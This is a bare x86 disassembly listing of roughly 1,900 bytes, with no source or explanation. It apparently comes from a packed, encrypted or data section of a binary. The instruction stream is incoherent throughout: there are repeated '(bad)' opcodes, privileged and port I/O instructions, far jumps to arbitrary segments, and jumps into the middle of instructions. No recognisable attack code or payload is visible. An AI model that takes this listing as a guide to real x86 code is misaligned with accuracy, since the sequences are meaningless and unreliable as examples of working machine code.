  41ee38:	lods   eax,DWORD PTR ds:[esi]
  41ee39:	mov    bl,BYTE PTR [ecx+ebp*8]
  41ee3c:	lods   al,BYTE PTR ds:[esi]
  41ee3d:	mov    esi,0x3bcc3c79
  41ee42:	pop    edi
  41ee43:	sub    al,0x46
  41ee45:	iret   
  41ee46:	cs or  edi,esp
  41ee49:	iret   
  41ee4a:	jne    0x41ee7d
  41ee4c:	sbb    BYTE PTR [edi+eax*2+0xe26722f],ah
  41ee53:	js     0x41eea1
  41ee55:	cwde   
  41ee56:	mov    eax,0xac6eb82d
  41ee5b:	std    
  41ee5c:	test   eax,0x5d3a4cbf
  41ee61:	xor    eax,0x97c70117
  41ee66:	idiv   bh
  41ee68:	mov    eax,0xc0707c52
  41ee6d:	sub    BYTE PTR [ecx],dl
  41ee6f:	addr16 in eax,dx
  41ee71:	daa    
  41ee72:	ficom  DWORD PTR [ecx-0x7c7989d]
  41ee78:	mov    al,ds:0xb6630851
  41ee7d:	(bad)  
  41ee7e:	(bad)  
  41ee7f:	(bad)  [ebx]
  41ee81:	cmp    DWORD PTR [ecx-0x17],0xffffffff
  41ee85:	or     al,0x5f
  41ee87:	push   ebp
  41ee88:	fs mov bp,0x60c0
  41ee8d:	jmp    0x41ee4e
  41ee8f:	jge    0x41eee5
  41ee91:	xchg   ebp,eax
  41ee92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee93:	dec    esi
  41ee94:	add    bh,BYTE PTR [edx+0x55]
  41ee97:	inc    ebp
  41ee98:	jg     0x41eefd
  41ee9a:	dec    ebp
  41ee9b:	add    esp,DWORD PTR [ecx+0xb399b1d]
  41eea1:	daa    
  41eea2:	stos   BYTE PTR es:[edi],al
  41eea3:	shl    DWORD PTR [edi-0x1401e920],0xdf
  41eeaa:	cmp    eax,0x5b2f1deb
  41eeaf:	(bad)  
  41eeb0:	out    dx,al
  41eeb1:	aad    0x26
  41eeb3:	iret   
  41eeb4:	cmp    BYTE PTR [esi-0x52],bl
  41eeb7:	ret    0xc2df
  41eeba:	xchg   edx,eax
  41eebb:	sub    DWORD PTR ds:0xa88cee,eax
  41eec1:	jmp    0x40ea:0xedb669b9
  41eec8:	cwde   
  41eec9:	lds    edx,FWORD PTR [edi]
  41eecb:	test   ah,bl
  41eecd:	mov    dl,0x68
  41eecf:	dec    ecx
  41eed0:	lds    esp,FWORD PTR [esi]
  41eed2:	cmp    al,0xd2
  41eed4:	test   DWORD PTR [eax],ebx
  41eed6:	outs   dx,DWORD PTR ds:[esi]
  41eed7:	nop
  41eed8:	add    ecx,DWORD PTR [ebx+0x6b]
  41eedb:	clc    
  41eedc:	pop    ecx
  41eedd:	mov    eax,ds:0x77200f58
  41eee2:	mov    ah,0xc7
  41eee4:	aaa    
  41eee5:	adc    DWORD PTR [edi],ecx
  41eee7:	jmp    0xd4c3:0x530489cb
  41eeee:	std    
  41eeef:	addr16 push ebp
  41eef1:	out    dx,al
  41eef2:	sti    
  41eef3:	dec    esi
  41eef4:	inc    edi
  41eef5:	retf   0xb04
  41eef8:	add    al,BYTE PTR [ebp+ecx*2-0x7a]
  41eefc:	mov    ebp,0x110fd788
  41ef01:	call   0xa9b3:0x3800a64c
  41ef08:	inc    edx
  41ef09:	loope  0x41ef00
  41ef0b:	lds    ebx,FWORD PTR [ecx+0x7bca6167]
  41ef11:	idiv   DWORD PTR [ecx-0xa]
  41ef14:	sar    DWORD PTR ds:0xffb106a0,1
  41ef1a:	xor    dh,BYTE PTR [ebp-0x1e5d8bf3]
  41ef20:	dec    esp
  41ef21:	add    BYTE PTR [ebx-0x45],al
  41ef24:	push   es
  41ef25:	fnstcw WORD PTR [esi+0x77274bda]
  41ef2b:	push   ds
  41ef2c:	je     0x41ef98
  41ef2e:	lods   eax,DWORD PTR ds:[esi]
  41ef2f:	cdq    
  41ef30:	push   eax
  41ef31:	xor    DWORD PTR ds:0xa7392d3c,0xffffffcc
  41ef38:	xor    BYTE PTR [esi+0x1f],0x5a
  41ef3c:	out    0x19,eax
  41ef3e:	mov    eax,ds:0x12f28f1d
  41ef43:	and    esp,DWORD PTR [ebx-0xa263e22]
  41ef49:	lahf   
  41ef4a:	push   es
  41ef4b:	out    0xed,al
  41ef4d:	loop   0x41ef4f
  41ef4f:	ja     0x41efbd
  41ef51:	or     DWORD PTR [esi],ecx
  41ef53:	dec    esi
  41ef54:	aam    0x47
  41ef56:	inc    ebx
  41ef57:	mov    es,WORD PTR [edi+0x524e83f7]
  41ef5d:	mov    ecx,0x14964f6a
  41ef62:	retf   0x5b60
  41ef65:	in     al,0xf0
  41ef67:	mov    cs,ebp
  41ef69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef6a:	push   cs
  41ef6b:	or     ecx,edi
  41ef6d:	pusha  
  41ef6e:	push   eax
  41ef6f:	aad    0xd9
  41ef71:	and    bh,0x49
  41ef74:	mov    bh,0xab
  41ef76:	rol    BYTE PTR [ecx-0x6985d69e],1
  41ef7c:	inc    edx
  41ef7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef7e:	and    ebx,esi
  41ef80:	or     eax,0x73062991
  41ef85:	ror    ecx,1
  41ef87:	test   BYTE PTR [esi],dh
  41ef89:	sbb    bl,dh
  41ef8b:	adc    BYTE PTR [edx-0x3c9dacf0],bh
  41ef91:	xchg   edx,edx
  41ef93:	sbb    DWORD PTR [edx-0x32],ebp
  41ef96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef97:	addr16 xchg edi,eax
  41ef99:	sbb    eax,0x42581b91
  41ef9e:	sbb    eax,0xe1e3181d
  41efa3:	int3   
  41efa4:	jnp    0x41ef73
  41efa6:	and    DWORD PTR [ecx],edi
  41efa8:	or     eax,ebx
  41efaa:	aaa    
  41efab:	fsubr  st(4),st
  41efad:	dec    edi
  41efae:	xchg   ebx,eax
  41efaf:	or     BYTE PTR [ecx+0x1f],bh
  41efb2:	jae    0x41ef6a
  41efb4:	mov    dl,0x48
  41efb6:	test   ebx,ebp
  41efb8:	sub    eax,0x36ea46c3
  41efbd:	push   eax
  41efbe:	fs (bad) 
  41efc0:	jl     0x41ef66
  41efc2:	inc    esi
  41efc3:	xor    ebp,ebp
  41efc5:	and    dh,ah
  41efc7:	add    BYTE PTR [esp+esi*2],0xc5
  41efcb:	mov    dh,0x90
  41efcd:	hlt    
  41efce:	icebp  
  41efcf:	mov    edx,0xc10dcaf5
  41efd4:	(bad)
  41efd8:	loope  0x41f026
  41efda:	inc    esp
  41efdb:	gs ins DWORD PTR es:[edi],dx
  41efdd:	cmc    
  41efde:	mov    ebp,0x4d111eba
  41efe3:	aam    0x86
  41efe5:	std    
  41efe6:	mov    WORD PTR [esi+0x2b],?
  41efe9:	mov    esp,0xbd6220ba
  41efee:	and    DWORD PTR [edi-0x2d6a4401],0x15c07204
  41eff8:	mov    eax,ds:0x3e88dfd6
  41effd:	and    cl,dl
  41efff:	sub    al,0x34
  41f001:	inc    ebp
  41f002:	scas   eax,DWORD PTR es:[edi]
  41f003:	dec    edx
  41f004:	jge    0x41f058
  41f006:	xor    dh,BYTE PTR [ebx]
  41f008:	(bad)  
  41f009:	ins    DWORD PTR es:[edi],dx
  41f00a:	test   eax,0x3fc7bfac
  41f00f:	mov    BYTE PTR [edi+0x7da5c7a],ah
  41f015:	in     eax,0x52
  41f017:	xor    dl,BYTE PTR [ebx+edi*8-0x7c]
  41f01b:	inc    ecx
  41f01c:	ds data16 fdivrp st(5),st
  41f020:	imul   eax,DWORD PTR [ebx],0xe
  41f023:	clc    
  41f024:	adc    DWORD PTR [ecx+edx*2-0x36],esi
  41f028:	je     0x41efd5
  41f02a:	sbb    BYTE PTR [edi-0x342b8d8b],ch
  41f030:	test   BYTE PTR [ebp+ecx*2+0x5ae71e36],al
  41f037:	imul   edx,DWORD PTR [esi],0x2400cb3
  41f03d:	adc    al,ch
  41f03f:	out    dx,al
  41f040:	call   FWORD PTR [edx-0x10]
  41f043:	xor    al,0xa5
  41f045:	pusha  
  41f046:	loopne 0x41efda
  41f048:	ins    BYTE PTR es:[edi],dx
  41f049:	popa   
  41f04a:	in     al,dx
  41f04b:	push   cs
  41f04c:	fst    DWORD PTR [edx+0x3f]
  41f04f:	fs call 0xd945d785
  41f055:	jp     0x41f030
  41f057:	repnz adc DWORD PTR [ecx-0x6307a655],ecx
  41f05e:	and    al,0xef
  41f060:	pop    eax
  41f061:	sbb    al,0xab
  41f063:	jo     0x41f076
  41f065:	sub    eax,0xd0f38222
  41f06a:	xor    al,bl
  41f06c:	test   BYTE PTR [eax],dl
  41f06e:	jb     0x41f070
  41f070:	or     eax,0xae12c0d5
  41f075:	lahf   
  41f076:	dec    ebp
  41f077:	sbb    DWORD PTR [ebx],0x9cc34430
  41f07d:	add    BYTE PTR [esi],ah
  41f07f:	xchg   esp,esi
  41f081:	xchg   esp,eax
  41f082:	adc    ecx,DWORD PTR [esi]
  41f084:	adc    dl,BYTE PTR [edi+0x3c67faa4]
  41f08a:	pop    ecx
  41f08b:	and    eax,0x10e6395f
  41f090:	dec    esi
  41f091:	inc    eax
  41f092:	cmp    eax,0x58dd47ab
  41f097:	jbe    0x41f0f2
  41f099:	ja     0x41f039
  41f09b:	push   esi
  41f09c:	push   ecx
  41f09d:	sub    ebp,DWORD PTR [edx]
  41f09f:	or     dh,BYTE PTR [edi+0x7a]
  41f0a2:	std    
  41f0a3:	data16 fistp QWORD PTR [edi]
  41f0a6:	xor    al,0xaa
  41f0a8:	mov    ebp,0x18b029fa
  41f0ad:	repz and edi,edi
  41f0b0:	enter  0x57cc,0xb
  41f0b4:	lds    ebx,FWORD PTR [edi+0x2e]
  41f0b7:	iret   
  41f0b8:	cdq    
  41f0b9:	pop    esi
  41f0ba:	imul   esp,DWORD PTR [eax-0x30],0xffffff90
  41f0be:	pop    edx
  41f0bf:	and    BYTE PTR [esi],cl
  41f0c1:	aad    0x48
  41f0c3:	stc    
  41f0c4:	xor    eax,edi
  41f0c6:	sti    
  41f0c7:	rcr    DWORD PTR [ecx],1
  41f0c9:	stc    
  41f0ca:	out    dx,eax
  41f0cb:	loope  0x41f057
  41f0cd:	jbe    0x41f0cb
  41f0cf:	fbstp  TBYTE PTR [ecx-0x3]
  41f0d2:	outs   dx,BYTE PTR fs:[esi]
  41f0d4:	or     esi,edx
  41f0d6:	aad    0xa5
  41f0d8:	adc    DWORD PTR [ebp+0x46],0x11
  41f0dc:	loop   0x41f12e
  41f0de:	jbe    0x41f0f2
  41f0e0:	aaa    
  41f0e1:	frstor [ecx]
  41f0e3:	mov    bh,0x14
  41f0e5:	retf   0x189
  41f0e8:	dec    eax
  41f0e9:	fwait
  41f0ea:	mov    esp,0x7068d29
  41f0ef:	imul   esp,DWORD PTR [eax+0x33],0x19c642c0
  41f0f6:	push   ecx
  41f0f7:	ss adc eax,0x671b3b69
  41f0fd:	retf   
  41f0fe:	les    esp,FWORD PTR [ecx-0x339478dc]
  41f104:	xchg   esi,eax
  41f105:	pop    edi
  41f106:	stos   DWORD PTR es:[edi],eax
  41f107:	(bad)  
  41f108:	(bad)  
  41f109:	fs pop ds
  41f10b:	div    BYTE PTR [edi+0x2d]
  41f10e:	imul   ebp,ebp,0xffffff92
  41f111:	jge    0x41f0f3
  41f113:	mov    edi,DWORD PTR [ecx]
  41f115:	adc    eax,0x2dd8d4d2
  41f11a:	add    esi,ebp
  41f11c:	lea    edi,[ecx]
  41f11e:	in     al,0x47
  41f120:	push   0xca79d9d9
  41f125:	ins    DWORD PTR es:[edi],dx
  41f126:	mov    es,WORD PTR [ebx]
  41f128:	(bad)  
  41f129:	cmp    esi,edx
  41f12b:	adc    eax,0xf866fafd
  41f130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f131:	inc    eax
  41f132:	cmp    eax,0x391479e8
  41f137:	nop
  41f138:	out    dx,al
  41f139:	push   cs
  41f13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f13b:	push   edi
  41f13c:	inc    ebx
  41f13d:	lock xor eax,0x43020cba
  41f143:	mov    ch,BYTE PTR [ebp+0x4b]
  41f146:	mov    eax,ds:0xda17b3a3
  41f14b:	call   0xd77a:0x87c5870
  41f152:	ficom  WORD PTR [ebx+0x6f9bb25e]
  41f158:	mov    edx,0xf700773
  41f15d:	push   es
  41f15e:	sub    BYTE PTR [ebp-0x28e70db],cl
  41f164:	aad    0x4
  41f166:	scas   al,BYTE PTR es:[edi]
  41f167:	stos   DWORD PTR es:[edi],eax
  41f168:	popa   
  41f169:	jecxz  0x41f179
  41f16b:	int    0x95
  41f16d:	retf   0x21f7
  41f170:	ss pop edx
  41f172:	popa   
  41f173:	and    al,0xf
  41f175:	add    dh,BYTE PTR [ecx+0x558a2b60]
  41f17b:	or     al,0x44
  41f17d:	outs   dx,DWORD PTR ds:[esi]
  41f17e:	repz sbb eax,0x9917f3e2
  41f184:	sub    al,0x4c
  41f186:	xchg   ebx,eax
  41f187:	test   eax,0x3c2c75ec
  41f18c:	cli    
  41f18d:	xchg   ebp,eax
  41f18e:	test   al,0x42
  41f190:	stos   BYTE PTR es:[edi],al
  41f191:	jecxz  0x41f128
  41f193:	aas    
  41f194:	xchg   ebx,eax
  41f195:	aad    0xcc
  41f197:	imul   edx,DWORD PTR [eax-0x8],0xffffff81
  41f19b:	mov    bh,0x9e
  41f19d:	push   ecx
  41f19e:	fistp  DWORD PTR [eax+0x562e3701]
  41f1a4:	int    0x3c
  41f1a6:	inc    eax
  41f1a7:	sbb    bl,dh
  41f1a9:	add    ebx,esi
  41f1ab:	cld    
  41f1ac:	out    dx,al
  41f1ad:	loop   0x41f1e8
  41f1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1b0:	dec    ebp
  41f1b1:	repz mov esi,0x2eb343d5
  41f1b7:	jmp    0x58ad:0x41c4c68f
  41f1be:	ds das 
  41f1c0:	pop    ecx
  41f1c1:	pushf  
  41f1c2:	adc    DWORD PTR [esi+eiz*1-0x16],edi
  41f1c6:	push   eax
  41f1c7:	(bad)  
  41f1c8:	iret   
  41f1c9:	bound  ecx,QWORD PTR [edi-0x80]
  41f1cc:	push   ebx
  41f1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ce:	fwait
  41f1cf:	cmp    bl,bh
  41f1d1:	sbb    ah,BYTE PTR [esi+0xdbdacd4]
  41f1d7:	test   al,0x83
  41f1d9:	enter  0x76f,0x2
  41f1dd:	jbe    0x41f1d0
  41f1df:	xor    BYTE PTR [esi],al
  41f1e1:	icebp  
  41f1e2:	fiadd  WORD PTR [eax+0x27fb629b]
  41f1e8:	fbstp  TBYTE PTR [edx]
  41f1ea:	retf   0xa72b
  41f1ed:	adc    eax,0x98680c6a
  41f1f2:	jge    0x41f1f3
  41f1f4:	outs   dx,BYTE PTR ds:[esi]
  41f1f5:	lea    edx,[eax]
  41f1f7:	sbb    DWORD PTR fs:[edx-0x7b04e0c0],ebx
  41f1fe:	xor    eax,0xb0cca55f
  41f203:	sbb    eax,0x6308824e
  41f208:	add    BYTE PTR [ebp-0x75e774c9],dl
  41f20e:	icebp  
  41f20f:	mul    BYTE PTR ds:0x3a3ced23
  41f215:	mov    dh,0x14
  41f217:	or     DWORD PTR [ebx+0x1e],ecx
  41f21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f21b:	mov    cl,0x8b
  41f21d:	mov    ebp,0x1c5e71f2
  41f222:	mov    esp,0xec018a91
  41f227:	lods   eax,DWORD PTR ds:[esi]
  41f228:	push   edx
  41f229:	push   0x7c174308
  41f22e:	add    al,0xdc
  41f230:	ins    BYTE PTR es:[edi],dx
  41f231:	popa   
  41f232:	mov    eax,0x383b93ff
  41f237:	sub    eax,0xeb04b0ec
  41f23c:	cmp    al,0xcf
  41f23e:	mov    edx,0xa9901d2e
  41f243:	out    0x70,eax
  41f245:	xchg   ebx,eax
  41f246:	ret    
  41f247:	sub    dh,bl
  41f249:	gs dec ebp
  41f24b:	retf   
  41f24c:	mov    DWORD PTR ds:0xf32773d8,ecx
  41f252:	std    
  41f253:	inc    esp
  41f254:	fst    DWORD PTR [eax+ecx*1]
  41f257:	add    cl,dl
  41f259:	js     0x41f274
  41f25b:	neg    DWORD PTR cs:[ebx]
  41f25e:	fs jb  0x41f2a2
  41f261:	call   0x6d4:0x75be03f4
  41f268:	das    
  41f269:	imul   esp,DWORD PTR [eax+0x1e2ea851],0xffffff90
  41f270:	sar    BYTE PTR [ebx-0xb],0xa
  41f274:	jl     0x41f27c
  41f276:	dec    ebp
  41f277:	aaa    
  41f278:	dec    ebp
  41f279:	out    dx,al
  41f27a:	out    dx,eax
  41f27b:	cmc    
  41f27c:	in     al,dx
  41f27d:	or     bl,BYTE PTR [ebx-0x5aa5eb7e]
  41f283:	add    eax,0x4f770bf0
  41f288:	shl    DWORD PTR [ebx-0x26],cl
  41f28b:	(bad)  
  41f28c:	test   BYTE PTR [ecx],0x3c
  41f28f:	add    DWORD PTR gs:[ebx-0xe4f6cfe],edi
  41f296:	pushf  
  41f297:	pop    ebp
  41f298:	push   esi
  41f299:	popa   
  41f29a:	jbe    0x41f231
  41f29c:	pop    ds
  41f29d:	(bad)  ds:0x43a288d4
  41f2a3:	push   ecx
  41f2a4:	push   ecx
  41f2a5:	aas    
  41f2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2a7:	wbinvd 
  41f2a9:	aad    0x5e
  41f2ab:	pop    esi
  41f2ac:	or     BYTE PTR [esi+ebp*1-0x5d3d889],ah
  41f2b3:	pop    edi
  41f2b4:	cld    
  41f2b5:	sub    edx,0xffffffb3
  41f2b8:	in     eax,0x36
  41f2ba:	retf   
  41f2bb:	or     BYTE PTR [edx-0x49],dh
  41f2be:	sub    edi,DWORD PTR [esi]
  41f2c0:	sub    al,0x96
  41f2c2:	cdq    
  41f2c3:	retf   0x6579
  41f2c6:	pop    eax
  41f2c7:	push   ebp
  41f2c8:	xor    ecx,esp
  41f2ca:	imul   ebx,DWORD PTR [edx-0x2bd702a4],0xbd6fd18f
  41f2d4:	stos   DWORD PTR es:[edi],eax
  41f2d5:	dec    ecx
  41f2d6:	adc    eax,0xec8636a4
  41f2db:	push   ecx
  41f2dc:	sub    edi,edx
  41f2de:	xlat   BYTE PTR ds:[ebx]
  41f2df:	xchg   BYTE PTR [eax+ebx*2],dh
  41f2e2:	or     BYTE PTR [ecx+0x64],0xc3
  41f2e6:	fisubr DWORD PTR [eax+ebp*2-0x4]
  41f2ea:	adc    edi,eax
  41f2ec:	jae    0x41f308
  41f2ee:	sub    dl,ah
  41f2f0:	(bad)  
  41f2f1:	inc    eax
  41f2f2:	(bad)  
  41f2f3:	std    
  41f2f4:	xchg   esp,eax
  41f2f5:	pop    ds
  41f2f6:	or     BYTE PTR [edi],dl
  41f2f8:	retf   0xc3ff
  41f2fb:	or     eax,0xd6803403
  41f300:	mov    WORD PTR [ebx],?
  41f302:	mov    DWORD PTR [ebp-0x3e],esp
  41f305:	mov    ebp,0x5fe0d105
  41f30a:	enter  0x4f9d,0xa9
  41f30e:	shl    edx,1
  41f310:	cli    
  41f311:	ins    DWORD PTR es:[edi],dx
  41f312:	sbb    DWORD PTR [esi+0x16],eax
  41f315:	test   al,0x49
  41f317:	jmp    0x493b:0xd2a918b3
  41f31e:	mov    ch,0x20
  41f320:	call   0xec5abcb1
  41f325:	test   BYTE PTR [eax+0x7f64aec5],0xdb
  41f32c:	push   ebx
  41f32d:	ja     0x41f34e
  41f32f:	cwde   
  41f330:	rep ins BYTE PTR es:[edi],dx
  41f332:	test   eax,0x3c4c4ce9
  41f337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f338:	lds    esi,FWORD PTR [ecx+0x78]
  41f33b:	rol    eax,0xeb
  41f33e:	add    al,0x1c
  41f340:	outs   dx,DWORD PTR ds:[esi]
  41f341:	outs   dx,BYTE PTR ds:[esi]
  41f342:	jmp    ebp
  41f344:	adc    BYTE PTR [eax-0x4e19a3ed],cl
  41f34a:	cmp    ch,bl
  41f34c:	sub    ebx,DWORD PTR [eax+0x71d149d9]
  41f352:	call   0xcf2b0831
  41f357:	fs and ecx,edx
  41f35a:	and    al,0x78
  41f35c:	and    DWORD PTR [si+0x480],ebp
  41f361:	jae    0x41f392
  41f363:	jmp    0x532b2bbb
  41f368:	sti    
  41f369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f36a:	pop    es
  41f36b:	mov    ds:0x2a0bc7ef,al
  41f370:	sahf   
  41f371:	rol    BYTE PTR [edi+0x4],1
  41f374:	loope  0x41f3b3
  41f376:	iret   
  41f377:	dec    esp
  41f378:	mov    ds:0x9f7acbbe,al
  41f37d:	fidiv  DWORD PTR [esp+edx*4-0x6abba0ce]
  41f384:	ficomp DWORD PTR [edi]
  41f386:	mov    ecx,esi
  41f388:	and    DWORD PTR [edi],edx
  41f38a:	jmp    0x2ff4:0xdae6efb3
  41f391:	xchg   BYTE PTR [ebp-0x51],ch
  41f394:	outs   dx,DWORD PTR ds:[esi]
  41f395:	and    al,0x59
  41f397:	stc    
  41f398:	maskmovq mm3,(bad)
  41f399:	neg    DWORD PTR [ecx+eiz*8-0x72]
  41f39d:	xchg   DWORD PTR [eax+0x46],ecx
  41f3a0:	or     DWORD PTR [ebx],ecx
  41f3a2:	jle    0x41f379
  41f3a4:	pop    ebx
  41f3a5:	stos   DWORD PTR es:[edi],eax
  41f3a6:	mov    al,0xb9
  41f3a8:	cld    
  41f3a9:	out    0xdd,al
  41f3ab:	shr    BYTE PTR [edi+edx*8],0x84
  41f3af:	pop    esi
  41f3b0:	aad    0x60
  41f3b2:	lods   al,BYTE PTR ds:[esi]
  41f3b3:	jno    0x41f362
  41f3b5:	mov    eax,ds:0x60e9ebdb
  41f3ba:	pop    ds
  41f3bb:	pop    ss
  41f3bc:	xor    DWORD PTR [ecx+0xc],0xffffffa2
  41f3c0:	into   
  41f3c1:	outs   dx,DWORD PTR ds:[esi]
  41f3c2:	push   es
  41f3c3:	stos   DWORD PTR es:[edi],eax
  41f3c4:	fldenv [esi-0x52]
  41f3c7:	repnz jmp 0x3bba:0xf431f88b
  41f3cf:	push   eax
  41f3d0:	pop    edi
  41f3d1:	sbb    eax,0x72447f0e
  41f3d6:	jne    0x41f35c
  41f3d8:	inc    edi
  41f3d9:	test   BYTE PTR [eax+0x44ac1015],0xef
  41f3e0:	stos   BYTE PTR es:[edi],al
  41f3e1:	rcr    BYTE PTR [ebp+0x32],0x6c
  41f3e5:	and    eax,0x1d7ce858
  41f3ea:	pop    eax
  41f3eb:	xchg   edi,eax
  41f3ec:	xchg   edx,eax
  41f3ed:	stos   BYTE PTR es:[edi],al
  41f3ee:	and    ebp,DWORD PTR [edi+0x69]
  41f3f1:	jae    0x41f436
  41f3f3:	(bad)  
  41f3f4:	jb     0x41f3d4
  41f3f6:	div    BYTE PTR [esi+0xd]
  41f3f9:	adc    ebx,eax
  41f3fb:	les    eax,FWORD PTR [ebx+ebp*2+0x46]
  41f3ff:	push   edi
  41f400:	adc    cl,dh
  41f402:	mov    DWORD PTR [ebp-0x6aa235ea],edi
  41f408:	xchg   edx,eax
  41f409:	pusha  
  41f40a:	fcom   QWORD PTR [ebx-0x55]
  41f40d:	xor    ax,0xd110
  41f411:	aaa    
  41f412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f413:	cdq    
  41f414:	(bad)  
  41f415:	jns    0x41f3d6
  41f417:	sub    ebp,ebx
  41f419:	pushf  
  41f41a:	dec    ebx
  41f41b:	mov    ecx,0x1b45748
  41f420:	mov    dl,0xfd
  41f422:	dec    esi
  41f423:	pusha  
  41f424:	into   
  41f425:	pop    es
  41f426:	mov    dl,0x7a
  41f428:	add    BYTE PTR [edi+0x49466508],ch
  41f42e:	and    eax,0x6a1a4c05
  41f433:	pop    ecx
  41f434:	push   eax
  41f435:	int3   
  41f436:	bound  eax,QWORD PTR [edx-0x8]
  41f439:	jo     0x41f477
  41f43b:	cmp    al,0xb9
  41f43d:	popf   
  41f43e:	add    al,0xea
  41f440:	mov    ch,0x35
  41f442:	out    0x5e,al
  41f444:	int3   
  41f445:	jmp    0xf00a02ae
  41f44a:	mov    ds:0x61e6eea9,eax
  41f44f:	cli    
  41f450:	inc    ecx
  41f451:	add    cl,bl
  41f453:	loop   0x41f49b
  41f455:	in     al,dx
  41f456:	xor    eax,0x9784b9b9
  41f45b:	push   0x4d2bdaf4
  41f460:	dec    ebp
  41f461:	sub    bl,BYTE PTR [eax-0x6a]
  41f464:	fdiv   QWORD PTR [ecx+ebx*4-0x21]
  41f468:	xchg   BYTE PTR [edx+0x15],bl
  41f46b:	add    DWORD PTR [eax+esi*4],0x1f3d2bcd
  41f472:	mov    al,0xb4
  41f474:	arpl   bp,cx
  41f476:	lods   eax,DWORD PTR ds:[esi]
  41f477:	inc    DWORD PTR [eax+0x51]
  41f47a:	inc    ebx
  41f47b:	adc    ah,BYTE PTR [ebp+0x56f6aad1]
  41f481:	imul   eax,DWORD PTR [eax+0x5f],0xffffffaf
  41f485:	push   ebp
  41f486:	(bad)  
  41f487:	out    0xbf,al
  41f489:	fistp  QWORD PTR [eax]
  41f48b:	sahf   
  41f48c:	pop    ebp
  41f48d:	push   cs
  41f48e:	xchg   ebx,eax
  41f48f:	jmp    0x41f50a
  41f491:	xor    ecx,esi
  41f493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f494:	mov    ds:0x3ea8a7e2,eax
  41f499:	jno    0x41f4d8
  41f49b:	mov    esi,0x4992e004
  41f4a0:	sub    al,0xf4
  41f4a2:	fsubr  DWORD PTR [edi]
  41f4a4:	hlt    
  41f4a5:	mov    eax,0x2641729f
  41f4aa:	push   es
  41f4ab:	or     DWORD PTR [ebx],ebx
  41f4ad:	and    dh,ah
  41f4af:	cmp    al,0x15
  41f4b1:	cmp    BYTE PTR [edi+ecx*2-0x1f],bl
  41f4b5:	xor    DWORD PTR [ecx+0x71ae7d8c],edi
  41f4bb:	mov    ebx,DWORD PTR [ecx-0x25]
  41f4be:	sbb    eax,0xc3122617
  41f4c3:	inc    ebp
  41f4c4:	sbb    eax,0x7842c83c
  41f4c9:	cmc    
  41f4ca:	loope  0x41f51a
  41f4cc:	jp     0x41f489
  41f4ce:	sahf   
  41f4cf:	inc    edx
  41f4d0:	jb     0x41f4fc
  41f4d2:	xor    ecx,edi
  41f4d4:	in     al,dx
  41f4d5:	mov    eax,0x528d1f9f
  41f4da:	stc    
  41f4db:	scas   eax,DWORD PTR es:[edi]
  41f4dc:	sbb    ebx,DWORD PTR [esi]
  41f4de:	not    DWORD PTR [ebx+0x35bc1eab]
  41f4e4:	out    dx,eax
  41f4e5:	out    dx,al
  41f4e6:	outs   dx,BYTE PTR ds:[esi]
  41f4e7:	fnstsw WORD PTR [ecx]
  41f4e9:	xchg   ecx,eax
  41f4ea:	into   
  41f4eb:	add    al,0x28
  41f4ed:	mov    al,0x77
  41f4ef:	push   esp
  41f4f0:	outs   dx,BYTE PTR ds:[esi]
  41f4f1:	ds retf 0x8e1e
  41f4f5:	(bad)  
  41f4f6:	push   edx
  41f4f7:	fisub  DWORD PTR [eax+0x1b28e06]
  41f4fd:	push   esi
  41f4fe:	or     al,0x20
  41f500:	cs sbb eax,0x389de534
  41f506:	dec    esp
  41f507:	fs jb  0x41f511
  41f50a:	push   eax
  41f50b:	inc    edi
  41f50c:	pop    esi
  41f50d:	sahf   
  41f50e:	cld    
  41f50f:	(bad)  
  41f510:	popf   
  41f511:	and    eax,0xa195f36
  41f516:	test   eax,0x622e0be5
  41f51b:	dec    eax
  41f51c:	jo     0x41f57b
  41f51e:	repnz lods al,BYTE PTR ds:[esi]
  41f520:	cld    
  41f521:	dec    ebx
  41f522:	mov    ds:0x758b14fa,eax
  41f527:	or     DWORD PTR [ebp-0x12],ebp
  41f52a:	popa   
  41f52b:	aas    
  41f52c:	xor    cl,ah
  41f52e:	(bad)  
  41f52f:	loop   0x41f586
  41f531:	out    dx,eax
  41f532:	sbb    al,0x10
  41f534:	xor    BYTE PTR [esp+esi*2+0x48],bh
  41f538:	mov    al,0xb1
  41f53a:	gs adc al,0xa1
  41f53d:	cdq    
  41f53e:	cmp    ebx,edx
  41f540:	sub    eax,edi
  41f542:	(bad)  
  41f543:	cld    
  41f544:	mov    bh,0x2
  41f546:	mov    ebx,0x9592ff0b
  41f54b:	hlt    
  41f54c:	adc    al,0xc2
  41f54e:	sbb    dl,BYTE PTR [edi+ecx*1]
  41f551:	inc    ebx
  41f552:	call   0x7f561d1e
  41f557:	or     eax,0x529e58a1
  41f55c:	and    eax,0xc97f1ef3
  41f561:	sbb    esi,DWORD PTR [ecx]
  41f563:	ja     0x41f506
  41f565:	enter  0xcd7,0x67
  41f569:	fbld   TBYTE PTR [eax]
  41f56b:	push   edx
  41f56c:	or     DWORD PTR [esi],esp
  41f56e:	scas   al,BYTE PTR es:[edi]
  41f56f:	popf   
  41f570:	pop    esp
  41f571:	(bad)  
  41f573:	pop    esi
  41f574:	outs   dx,DWORD PTR ds:[esi]
  41f575:	cmp    bh,ah
  41f577:	fbld   TBYTE PTR [edi+0x7]
  41f57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f57b:	cmp    bh,BYTE PTR [eax-0x1d]
  41f57e:	or     DWORD PTR [edx],esi
  41f580:	mov    BYTE PTR [ebp-0x35],ch
  41f583:	jno    0xaf0ac67a
  41f589:	or     BYTE PTR [eax-0x6e],0x78
  41f58d:	jbe    0x41f5eb
  41f58f:	mov    esi,0xd1e2f028
  41f594:	mov    eax,0xdf1c6e8d
  41f599:	ja     0x41f546
